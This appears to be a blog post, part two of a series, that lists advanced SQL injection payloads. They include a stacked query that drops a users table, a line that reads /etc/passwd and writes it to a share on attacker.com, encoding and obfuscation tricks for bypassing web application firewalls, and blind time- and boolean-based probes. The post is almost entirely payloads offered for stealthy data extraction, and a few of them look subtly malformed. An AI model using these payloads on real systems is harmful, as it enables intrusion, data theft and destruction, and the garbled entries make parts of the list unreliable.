# :game_die: Advanced SQL Injection Techniques to Data Exfiltration, OoB, Leveraging JSON etc. (Part -2 of Advanced SQL Injection Techniques by nav1n)

---

# Advanced SQL Injection Techniques to Data Exfiltration, OoB, Leveraging JSON etc. (Part -2 of Advanced SQL Injection Techniques by nav1n)

Here are some advanced SQL injection techniques that go beyond basic attacks. Learn how to execute data exfiltration, leverage Out-of-Band (OOB) channels, and utilize JSON functions for more complex and stealthy exploits. These methods are designed to bypass advanced security mechanisms and extract sensitive information efficiently.

## Get nav1n👨🏻‍💻⚠️’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

This article is part of “Advanced SQL Injection Techniques by nav1n”. Originally posted on: [https://nav1n0x.gitbook.io/advanced-sql-injection-techniques](https://nav1n0x.gitbook.io/advanced-sql-injection-techniques)

### Stacked Queries:

Executing multiple statements: ⚠️⚠️⚠️⚠️

```
'; DROP TABLE users; SELECT * FROM admin --
```

### SQLi with Web Application Firewalls:

Using obfuscated payloads:

```
' UNION SELECT CHAR(117,115,101,114,110,97,109,101), CHAR(112,97,115,115,119,111,114,100) --
```

### Leveraging SQL Functions:

Using SQL functions for data exfiltration:

```
' UNION SELECT version(), current_database() --
```

### DNS Exfiltration:

Using DNS requests for data exfiltration:

```
'; SELECT load_file('/etc/passwd') INTO OUTFILE '\\\\attacker.com\\share' --
```

### Leveraging JSON Functions:

Extracting data using JSON functions:

```
' UNION SELECT json_extract(column_name, '$.key') FROM table_name --
```

### WAF Bypass Techniques for SQL Injection

### 1. Using Encoding and Obfuscation

URL Encoding: Encode parts of the payload to bypass basic keyword detection.

```
%27%20UNION%20SELECT%20NULL,NULL,NULL--
```

Double URL Encoding: Double encode the payload to evade detection mechanisms.

```
%2527%2520UNION%2520SELECT%2520NULL,NULL,NULL--
```

Hex Encoding: Use hexadecimal encoding for the payload.

```
' UNION SELECT 0x61646D696E, 0x70617373776F7264 --
```

### 2. Case Manipulation and Comments

Mixed Case: Change the case of SQL keywords.

```
' uNioN SeLecT NULL, NULL --
```

Inline Comments: Insert comments within SQL keywords to obfuscate the payload.

```
' UNION//SELECT//NULL,NULL --
```

### 3. Whitespace and Special Characters

Using Different Whitespace Characters: Replace spaces with other whitespace characters like tabs or newlines.

```
' UNION%0D%0ASELECT%0D%0A NULL,NULL --
```

Concatenation with Special Characters: Use special characters and concatenation to build the payload dynamically.

```
' UNION SELECT CHAR(117)||CHAR(115)||CHAR(101)||CHAR(114), CHAR(112)||CHAR(97)||CHAR(115)||CHAR(115) --
```

### 4. SQL Function and Command Obfuscation

String Concatenation: Break strings into smaller parts and concatenate them.

```
' UNION SELECT 'ad'||'min', 'pa'||'ss' --
```

Using SQL Functions: Leverage SQL functions to manipulate the payload.

```
' UNION SELECT VERSION(), DATABASE() --
```

### 5. Time-Based and Boolean-Based Payloads

Time-Based Blind SQL Injection: Use time delays to infer information from the response.

```
' AND IF(1=1, SLEEP(5), 0) --
```

Boolean-Based Blind SQL Injection: Use conditions that alter the response based on true or false conditions.

```
' AND IF(1=1, 'A', 'B')='A' --
```

### 6. Advanced Encoding Techniques

Base64 Encoding: Encode payloads using Base64.

```
' UNION SELECT FROM_BASE64('c2VsZWN0IHZlcnNpb24oKQ==') --
```

Custom Encoding Scripts: Create custom scripts to encode and decode payloads in different formats.

### 7. Chaining Techniques

Combining Multiple Bypass Techniques: Use a combination of techniques to create a more complex and harder-to-detect payload.

```
%27%20UNION//SELECT//CHAR(117)%7C%7CCHAR(115)%7C%7CCHAR(101)%7C%7CCHAR(114),%20CHAR(112)%7C%7CCHAR(97)%7C%7CCHAR(115)%7C%7CCHAR(115)%20--%0A
```

### 8. Leveraging Lesser-Known SQL Features

Using JSON Functions: Leverage JSON functions to manipulate and extract data.

```
' UNION SELECT json_extract(column_name, '$.key') FROM table_name --
```

Using XML Functions: Utilize XML functions to create more complex payloads.

```
' UNION SELECT extractvalue(1, 'version()') --
```

---
